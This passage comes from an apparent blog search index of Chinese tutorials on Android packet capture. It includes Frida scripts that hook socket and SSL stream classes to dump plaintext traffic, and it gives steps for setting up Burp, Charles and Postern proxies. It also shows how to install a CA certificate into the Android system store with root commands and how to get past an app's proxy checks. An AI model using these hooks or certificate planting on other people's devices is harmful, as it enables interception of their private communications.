\"Content-Type: \" + requestBody.contentType()); } if (requestBody.contentLength() != -1) { Log.e(TAG, \"Content-Length: \" + requestBody.contentLength()); } } Headers headers = request.headers(); for (int i = 0, count = headers.size(); i \u003c count; i++) { String name = headers.name(i); // Skip headers from the request body as they are explicitly logged above. if (!\"Content-Type\".equalsIgnoreCase(name) \u0026\u0026 !\"Content-Length\".equalsIgnoreCase(name)) { Log.e(TAG, name + \": \" + headers.value(i)); } } if ","date":"2022-05-29","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/:2:2","tags":["抓包"],"title":"Http(s)网络框架分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"终极\"自吐” Socket ","date":"2022-05-29","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/:3:0","tags":["抓包"],"title":"Http(s)网络框架分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"理论基础 以Http为例,Http数据从应用层发送之后,依次通过传输层、网络层、链路层,在经过每一层时都会被包裹上头部数据,以保证数据在传输过程中的完整性,然后传输给接收方;接收方以相反的过程依次去除头部数据从而获取真实传输的Http数据.因此如果对App进行抓包,那么不仅仅是应用层,在传输层、网络层等应用层往下的所有层级都可以获取传输的全部数据.这正是传输层进行Socket终极抓包的理论基础. 之所以选择在传输层进行抓包,是因为不管App是使用系统自带的Http(s)收发包框架还是第三方的Http(s)收发包框架,都不可避免的会经过系统的Socket相关类,而且Socket都是系统完成的,因此相关类一定不会被混淆. ","date":"2022-05-29","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/:3:1","tags":["抓包"],"title":"Http(s)网络框架分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"Http 这里以上方使用的HttpURLConnectionDemo为例,开发Http的Socket\"自吐\"脚本. 前期研究 点击App界面上的发送请求按钮后,使用Objection搜索内存中Socket相关的类. objection.exe -g com.example.luodst explore android hooking search classes socket 将搜索出来的结果复制到1.txt文件中,并在每一行前添加android hooking watch class. 利用objection -c参数批量HookSocket相关类.(如果出现崩溃现象,可以删除或将导致崩溃的类移到另一个文件中待下次执行即可) objection.exe -g com.example.luodst explore -c .\\1.txt 点击App界面上的\"发送请求\"按钮,会发现下图中的几个与Socket相关的类被调用了,如此可进一步缩小Socket相关类的范围. 此时分别对上图中一些可疑的函数进行进一步的Hook并打印调用栈进行观察.这里观察到比较可以的函数是java.net.AbstractPlainSocketImpl.acquireFD android hooking watch class_method java.net.AbstractPlainSocketImpl.acquireFD --dump-args --dump-backtrace --dump-return 上述调用栈中发现了已经了HttpURLConnection 的发包函数com.android.okhttp.internal.huc.HttpURLConnectionImpl.getInputStream,此时再通过Android源码查看下java.net.AbstractPlainSocketImpl.acquireFD的上层函数java.net.SocketOutputStream.socketWrite http://androidxref.com/8.1.0_r33/xref/libcore/ojluni/src/main/java/java/net/SocketOutputStream.java 可以发现java.net.SocketOutputStream.socketWrite这个函数的第一个参数实际上就是网络传输的数据内容. 同样的在获取response相关函数上找到了java.net.SocketInputStream.read([B, int, int)函数. “自吐\"脚本 function jhexdump(array) { var ptr = Memory.alloc(array.length); for(var i = 0; i \u003c array.length; ++i) Memory.writeS8(ptr.add(i), array[i]); //console.log(hexdump(ptr, { offset: off, length: len, header: false, ansi: false })); console.log(hexdump(ptr, { offset: 0, length: array.length, header: false, ansi: false })); } function hookSocket() { Java.perform(function () { // java.net.SocketOutputStream.write // java.net.SocketOutputStream.socketWrite Java.use('java.net.SocketOutputStream').socketWrite.overload('[B', 'int', 'int').implementation = function (bytearray1, int1, int2) { var result = this.socketWrite(bytearray1, int1, int2) console.log('socketWrite result,bytearray1,int1,int2=\u003e', result, bytearray1, int1, int2) var ByteString = Java.use(\"com.android.okhttp.okio.ByteString\"); // console.log('contents: =\u003e ', ByteString.of(bytearray1).hex()) jhexdump(bytearray1) return result } // java.net.SocketInputStream.read // java.net.SocketInputStream.socketRead0 Java.use('java.net.SocketInputStream').read.overload('[B', 'int', 'int').implementation = function (bytearray1, int1, int2) { var result = this.read(bytearray1, int1, int2) console.log('read result,bytearray1,int1,int2=\u003e', result, bytearray1, int1, int2) var ByteString = Java.use(\"com.android.okhttp.okio.ByteString\"); //console.log('contents: =\u003e ', ByteString.of(bytearray1).hex()) jhexdump(bytearray1) return result } }) } function main(){ hookSocket() } setImmediate(main) ","date":"2022-05-29","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/:3:2","tags":["抓包"],"title":"Http(s)网络框架分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"Https 前期研究 将上方使用的HttpURLConnectionDemo中的URL由http://www.baidu.com修改为https://www.baidu.com,然后重新按照上面的流程进行trace和Hook,最终发现在进行Https连接时一定会经过下图中的函数. 其中比较关键的函数是com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLOutputStream.write([B, int, int)和com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLInputStream.read([B, int, int),并且它们的第一个参数永远是明文的request或response数据. “自吐\"脚本 function jhexdump(array) { var ptr = Memory.alloc(array.length); for(var i = 0; i \u003c array.length; ++i) Memory.writeS8(ptr.add(i), array[i]); //console.log(hexdump(ptr, { offset: off, length: len, header: false, ansi: false })); console.log(hexdump(ptr, { offset: 0, length: array.length, header: false, ansi: false })); } function hookSSLSocketAndroid8(){ Java.perform(function () { // com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLOutputStream.write Java.use('com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLOutputStream').write.overload('[B', 'int', 'int').implementation = function (bytearray1, int1, int2) { var result = this.write(bytearray1, int1, int2) console.log('write result,bytearray1,int1,int2=\u003e', result, bytearray1, int1, int2) var ByteString = Java.use(\"com.android.okhttp.okio.ByteString\"); //console.log('contents: =\u003e ', ByteString.of(bytearray1).hex()) jhexdump(bytearray1) return result } // com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLInputStream.read Java.use('com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLInputStream').read.overload('[B', 'int', 'int').implementation = function (bytearray1, int1, int2) { var result = this.read(bytearray1, int1, int2) console.log('read result,bytearray1,int1,int2=\u003e', result, bytearray1, int1, int2) var ByteString = Java.use(\"com.android.okhttp.okio.ByteString\"); //console.log('contents: =\u003e ', ByteString.of(bytearray1).hex()) jhexdump(bytearray1) return result } }) } function main(){ hookSSLSocketAndroid8() } setImmediate(main) ","date":"2022-05-29","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/:3:3","tags":["抓包"],"title":"Http(s)网络框架分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"hookAddress 在上面的流程中,针对Http(s)收发包内容的\"自吐\"脚本已经开发完毕,但是还缺少一个关键的内容:获取收发包的IP地址和端口. 前期研究 这里仍然使用上方HttpURLConnectionDemo为例,重新按照上面的流程进行trace和Hook,不过需要注意的是这次测试的是所有Socket相关类的构造函数. 点击App界面上的发送请求按钮后,使用Objection搜索内存中Socket相关的类. objection.exe -g com.example.luodst explore android hooking search classes socket 将搜索出来的结果复制到1.txt文件中,并在每一行前添加android hooking watch class_method,在每一行的行尾添加.$init –dump-args –dump-backtrace –dump-return. 这里可以使用NotePad++,来批量完成在行尾添加数据.(Ctrl+H打开替换窗口) 利用objection -c参数批量HookSocket相关类构造函数.(如果出现崩溃现象,可以删除或将导致崩溃的类构造函数移到另一个文件中待下次执行即可) objection.exe -g com.example.luodst explore -c .\\1.txt 点击App界面上的\"发送请求\"按钮,会发现不管是Http还是Https都会调用到一些相同的函数,这里最终关注的函数是java.net.InetSocketAddress.InetSocketAddress 下方是Http协议Hook的结果. 下方是Https协议Hook的结果. “自吐\"脚本 function hookAddress(){ Java.perform(function(){ // java.net.InetSocketAddress.InetSocketAddress(java.net.InetAddress, int) Java.use('java.net.InetSocketAddress').$init.overload('java.net.InetAddress', 'int').implementation = function(addr,port){ var result = this.$init(addr,port) console.log('addr,port =\u003e',addr.toString(),port) return result } }) } function main(){ hookAddress() } setImmediate(main) 从上方结果中可以看到不仅仅有访问的网址信息,还存在本地的IP信息.那么如何区分本地地址和远程地址信息呢?这里我们可以看下java.net.InetAddress类的源码中的相关函数. http://androidxref.com/8.1.0_r33/xref/libcore/ojluni/src/main/java/java/net/InetAddress.java 故最终的\"自吐\"脚本如下: function hookAddress(){ Java.perform(function(){ // java.net.InetSocketAddress.InetSocketAddress(java.net.InetAddress, int) Java.use('java.net.InetSocketAddress').$init.overload('java.net.InetAddress', 'int').implementation = function(addr,port){ var result = this.$init(addr,port) //console.log('addr,port =\u003e',addr.toString(),port) if(addr.isSiteLocalAddress()){ console.log('Local address =\u003e',addr.toString(),', port is ',port) }else{ console.log('Server address =\u003e',addr.toString(),', port is ',port) } return result } }) } function main(){ hookAddress() } setImmediate(main) ","date":"2022-05-29","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/:3:4","tags":["抓包"],"title":"Http(s)网络框架分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"hookSocket汇总 function jhexdump(array) { var ptr = Memory.alloc(array.length); for(var i = 0; i \u003c array.length; ++i) Memory.writeS8(ptr.add(i), array[i]); //console.log(hexdump(ptr, { offset: off, length: len, header: false, ansi: false })); console.log(hexdump(ptr, { offset: 0, length: array.length, header: false, ansi: false })); } function hookAddress(){ Java.perform(function(){ // java.net.InetSocketAddress.InetSocketAddress(java.net.InetAddress, int) Java.use('java.net.InetSocketAddress').$init.overload('java.net.InetAddress', 'int').implementation = function(addr,port){ var result = this.$init(addr,port) //console.log('addr,port =\u003e',addr.toString(),port) if(addr.isSiteLocalAddress()){ console.log('Local address =\u003e',addr.toString(),', port is ',port) }else{ console.log('Server address =\u003e',addr.toString(),', port is ',port) } return result } }) } function hookSocket() { Java.perform(function () { // java.net.SocketOutputStream.write // java.net.SocketOutputStream.socketWrite Java.use('java.net.SocketOutputStream').socketWrite.overload('[B', 'int', 'int').implementation = function (bytearray1, int1, int2) { var result = this.socketWrite(bytearray1, int1, int2) console.log('socketWrite result,bytearray1,int1,int2=\u003e', result, bytearray1, int1, int2) var ByteString = Java.use(\"com.android.okhttp.okio.ByteString\"); // console.log('contents: =\u003e ', ByteString.of(bytearray1).hex()) jhexdump(bytearray1) return result } // java.net.SocketInputStream.read // java.net.SocketInputStream.socketRead0 Java.use('java.net.SocketInputStream').read.overload('[B', 'int', 'int').implementation = function (bytearray1, int1, int2) { var result = this.read(bytearray1, int1, int2) console.log('read result,bytearray1,int1,int2=\u003e', result, bytearray1, int1, int2) var ByteString = Java.use(\"com.android.okhttp.okio.ByteString\"); //console.log('contents: =\u003e ', ByteString.of(bytearray1).hex()) jhexdump(bytearray1) return result } }) } function hookSSLSocketAndroid8(){ Java.perform(function () { // com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLOutputStream.write Java.use('com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLOutputStream').write.overload('[B', 'int', 'int').implementation = function (bytearray1, int1, int2) { var result = this.write(bytearray1, int1, int2) console.log('write result,bytearray1,int1,int2=\u003e', result, bytearray1, int1, int2) var ByteString = Java.use(\"com.android.okhttp.okio.ByteString\"); //console.log('contents: =\u003e ', ByteString.of(bytearray1).hex()) jhexdump(bytearray1) return result } // com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLInputStream.read Java.use('com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLInputStream').read.overload('[B', 'int', 'int').implementation = function (bytearray1, int1, int2) { var result = this.read(bytearray1, int1, int2) console.log('read result,bytearray1,int1,int2=\u003e', result, bytearray1, int1, int2) var ByteString = Java.use(\"com.android.okhttp.okio.ByteString\"); //console.log('contents: =\u003e ', ByteString.of(bytearray1).hex()) jhexdump(bytearray1) return result } }) } function main(){ hookAddress() //hookSocket() // hookSSLSocketAndroid8() } setImmediate(main) ","date":"2022-05-29","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/:3:5","tags":["抓包"],"title":"Http(s)网络框架分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"总结 虽然上述\"自吐\"脚本是基于HttpURLConnection开发的,但经过测试,使用okhttp3和Retrofit框架的App同样能完成网络数据包的抓包工作.从理论上讲上述\"自吐\"脚本应该可以通杀所有使用系统Socket进行收发包的App.但需要注意的是上述脚本还存在一些问题,比如URL信息和收发包的对应关系、request和response如何更加精确的一对一等. ","date":"2022-05-29","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/:3:6","tags":["抓包"],"title":"Http(s)网络框架分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"参考链接 \u003c安卓Frida逆向与抓包实战\u003e ","date":"2022-05-29","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/:4:0","tags":["抓包"],"title":"Http(s)网络框架分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"抓包详解 ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:0:0","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"介绍 抓包通常是指通过一些手段获取App与服务器之间传输的明文网络数据信息. 抓包分为以下两种情形: Hook抓包:通过对发包函数的Hook来达到抓包的作用. 中间人抓包:将原来一段完整的客户端-服务器的通信方式割裂成两段客户端-服务器的通信. 中间人的抓包在OSI七层网络模型的结构中通常又会被分成以下两种情形: 应用层:Http(s)协议抓包. 会话层:Socket通信抓包. ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:1:0","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"Http抓包配置 首先要将计算机和测试手机连接在同一个局域网中并且要确保手机和计算机能够相互访问. ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:2:0","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"WLAN代理 在手机设置代理时,可以选择\"设置\"应用中的WLAN设置,长按选择\"修改网络\"选项,并在弹出的对话框中选择手动代理,设置代理服务器地址为主机的地址以及端口,这里端口为8080. 上述这种配置代理的方式可被下述App代码检测,而导致最终抓不到数据包,因此推荐使用VPN代理方式. System.getProperty(\"http.proxyHost\"); System.getProperty(\"http.proxyPort\"); 相对于直接从应用层设置WLAN代理的方式,VPN代理则是通过虚拟出一个新的网卡,从网络层加上该层代理,不仅可以绕过上述App代码的检测,而且检测VPN代理的API相对较少,也比较容易绕过. ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:2:1","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"VPN代理 为了配置VPN代理,首先需要下载一个VPN软件,这里推荐Postern这个App. adb安装Postern,进入App主页面,然后单击App左上方将菜单调出. 进入\"配置代理\"页面后单击\"代理1:proxy\",配置服务器IP地址为主机IP、端口为8080,再选择代理类型为HTTPS/HTTP CONNECT,配置完毕后单击\"保存\"按钮并退出页面. 配置完代理后,重新单击App左上角,待弹出菜单后选择\"配置规则\",清空原来的所有规则并创建一个新的规则,分别设置\"动作\"选项为\"通过代理连接\" “代理/代理组\"为刚才设置的代理(这里为192.168.1.5:8080),并设置\"目标地址\"为”*“或者直接清空以指定手机所有流量从代理经过.注意,“开启抓包\"选项要关闭. 在上述代理和规则都设置完毕后,重新打开菜单项单击\"关闭VPN\"并开启VPN.这样测试机的配置就完成了. ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:2:2","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"BurpSuite 接下来使用BurpSuite来进行测试抓包. 打开BurpSuite,单击Proxy-\u003eIntercept,再单击Intercept is On按钮关闭拦截模式. 在关闭拦截模式后,单击Options按钮并把代理地址修改为本机IP地址和端口8080.设置好代理地址后,单击OK按钮完成抓包的全部配置. 手机和PC端抓包设置完毕后,在手机浏览器上访问任意Http网址,就可以在\"HTTP history\"页面中看到抓到的Http明文数据了.(这里手机访问的网址为:http://www.jwc.ldu.edu.cn/wlgxk.asp) ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:2:3","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"Charles 依次单击Proxy-\u003eProxy Settings,在弹出的窗口中对端口进行配置. 注意:如果只是抓取HTTP类型的数据包,要关闭SSL Proxying模式(默认开启). 如果不关掉,抓取HTTP数据包,就会出现上面的问题,明明是HTTP协议却被识别为HTTPS协议. ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:2:4","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"Https抓包配置 ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:3:0","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"开启SSL Proxying 为了能够成功抓取HTTPS的数据,首先需要通过Ctrl+L快捷键开启Charles的SSL Proxying模式. 为了解决上述错误,我们需要设置下SSL Proxying. 注意: 这里要设置下端口,不设置端口,Charles只会做转发,不会解密Https数据. ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:3:1","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"将Charles证书加入到Android系统信任的证书列表中 在开启SSL Proxying模式后,用VPN代理模式使用手机浏览器访问任意HTTPS站点时,浏览器会显示提示信息\"您的连接不是私密连接”,为了解决这个问题,我们需要将Charles证书加入到Android系统信任的证书列表中,具体步骤如下: Charles导出cer证书,保存在PC上. 修改证书名称. //Android系统证书目录 /system/etc/security/cacerts/ //每个证书的命名规则,文件名是一个Hash值，而后缀是一个数字 //后缀名的数字是为了防止文件名冲突的,比如如果两个证书算出的Hash值是一样的话,那么一个证书的后缀名数字可以设置成0,而另一个证书的后缀名数字可以设置成1 \u003cCertificate_Hash\u003e.\u003cNumber\u003e //文件名可以用下面的命令计算出来 openssl x509 -inform DER -subject_hash_old -in \u003cCertificate_File.cer\u003e openssl x509 -inform PEM -subject_hash_old -in \u003cCertificate_File.pem\u003e 复制证书到Android设备上. adb push xxxxxxx.0 /sdcard/ 复制到Android系统目录,并修改权限. adb shell su mount -o remount,rw / cp /sdcard/1146ce35.0 /system/etc/security/cacerts/ chmod 777 /system/etc/security/cacerts/* mount -o remount,ro / adb reboot 执行完上述命令,手机重启之后,Charles的证书就会放在系统证书中被系统信任. 如果运气不好,可能会出现下面的错误,原因是root的不彻底,权限不够,换一种方式root即可. 此时切换为VPN代理模式,用手机浏览器访问任意HTTPS站点,Charles就能够正常抓到数据了. ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:3:2","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"Socks5抓包配置 如果App不使用HTTP/HTTPS连接方式,那么主机的抓包软件就无法正常抓到数据包,为了绕过对协议的限制,我们选择将VPN代理中的\"代理类型\"设置为SOCKS5模式,为了区分于HTTPS/HTTP CONNECT代理类型要将服务器端口修改为8888,从而从应用层的下层对所有网络连接进行抓取. 与此同时要在Charles上进行配置. 由于使用的是SOCKS代理模式,因此哪怕App使用Socket进行网络连接,Charles也可以正常抓取. ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:4:0","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"OSI七层模型 OSI七层网络模型 TCP/IP五层概念模型 对应网络协议 应用层(Application) HTTP、HTTPS、WS、FTP、DNS、SMTP、TFTP、SNMP、POP3、DHCP 表示层(Presentation) 应用层 TELNET、RLOGIN、SNMP、GOPHER 会话层(Session) SMTP、DNS 传输层(Transport) 传输层 TCP、UDP 网络层(Network) 网络层 IP(TPV4、IPV6)、ICMP、IGMP、ARP 数据链路层(Data Link) 数据链路层 FDDI、ETHERNET、APPANET、PDN、SLIP、PPP 物理层(Physical) 物理层 IEEE 802.1A、IEEE 802.2到IEEE 802.11 ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:5:0","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"Http协议 HTTP(超文本传输协议)是一个基于请求与响应模式的、无状态的、应用层的协议，基于TCP的连接方式. ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:6:0","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"URL URL是一种特殊类型的URI,包含了用于查找某个资源的足够的信息.格式如下: http://host[\":\"port][abs_path] http: 表示要通过HTTP协议来定位网络资源. host: 表示合法的Internet主机域名或者IP地址. port: 指定一个端口号,为空则使用缺省端口80. abs_path: 指定请求资源的URI,如果URL中没有给出abs_path,那么当它作为请求URI时,必须以“/”的形式给出. ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:6:1","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"Http请求 由以下四部分组成:请求行、请求头部、请求空行、请求数据. 下方的URL其实是abs_path. ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:6:2","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"请求方法 方法 描述 GET 请求获取Request-URI所标识的资源 POST 在Request-URI所标识的资源后附加新的数据 HEAD 请求获取由Request-URI所标识的资源的响应消息报头 PUT 请求服务器存储一个资源,并用Request-URI作为其标识 DELETE 请求服务器删除Request-URI所标识的资源 TRACE 请求服务器回送收到的请求信息,主要用于测试或诊断 CONNECT 用于某些代理服务器,请求的连接转化为一个安全隧道 OPYIONS 请求查询服务器的性能,或者查询与资源相关的选项和需求 PATCH 是对PUT方法的补充,用来对已知资源进行局部更新 ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:6:3","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"请求头 请求头 描述 Host 接受请求的服务器地址,可以是IP:端口号,也可以是域名 User-Agent 发送请求的应用程序名称 Connection 指定与连接相关的属性,如Connection:Keep-Alive Accept-Charset 通知服务端可以发送的编码格式 Accept-Encoding 通知服务端可以发送的数据压缩格式 Accept-Language 通知服务端可以发送的语言 ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:6:4","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"Http响应 由以下四部分组成:状态行、响应头部、响应空行、响应正文. ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:6:5","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"Https实现原理 Https的整体过程分为证书验证和数据传输阶段. 证书验证阶段 